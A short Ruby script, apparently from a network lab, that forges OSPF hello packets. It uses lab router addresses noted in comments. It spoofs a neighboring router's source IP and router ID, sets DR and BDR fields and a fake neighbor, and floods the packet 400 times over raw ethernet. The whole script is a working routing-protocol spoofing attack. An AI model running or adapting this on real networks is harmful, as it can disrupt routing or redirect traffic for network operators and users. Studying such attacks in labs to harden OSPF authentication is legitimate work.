load "core.rb"

hello = Factory.create_ospf_hello_packet

host_ip = Socket.getmyhostip
host_mac = Socket.getmyhostmac

# R1 e0/0 ip  10.1.1.1
# R1 e0/0 mac cc:01:29:94:00:00
# R1 e0/1 ip  12.1.1.1
# R1 e0/1 mac cc:01:29:94:00:01

# R2 e0/0 ip  10.1.1.3
# R2 e0/0 mac cc:02:36:c8:00:00
# R2 e0/1 ip  12.1.1.2
# R2 e0/1 mac cc:02:36:c8:00:01
# R2 e0/2 ip  23.1.1.2
# R2 e0/1 mac cc:02:36:c8:00:02

# R3 e0/0 ip  23.1.1.3
# R3 e0/0 mac cc:03:3f:88:00:00

# eth
hello.eth_src = host_mac
hello.eth_daddr = "cc:01:29:94:00:00"

# ip
hello.ip_saddr = "23.1.1.2"
hello.ip_daddr = "23.1.1.3"

# ospf header
hello.ip_ttl = 3
hello.ospf_len = 48
hello.ospf_rid_quad = "2.2.2.2"
hello.ospf_aid_quad = "0.0.0.1"

# ospf hello
hello.ospf_netmask_quad = "255.255.255.0"
hello.ospf_opt_set "e"

hello.ospf_dr_quad = "23.1.1.3"
hello.ospf_bdr_quad = "23.1.1.2"
hello.ospf_nbr_quad = "5.5.5.5"

# recalc
hello.ospf_recalc
hello.ip_recalc


socket = Socket.create_eth0
400.times do 
	socket.send(hello.to_s, 0)
	sleep 0.5
end



p hello
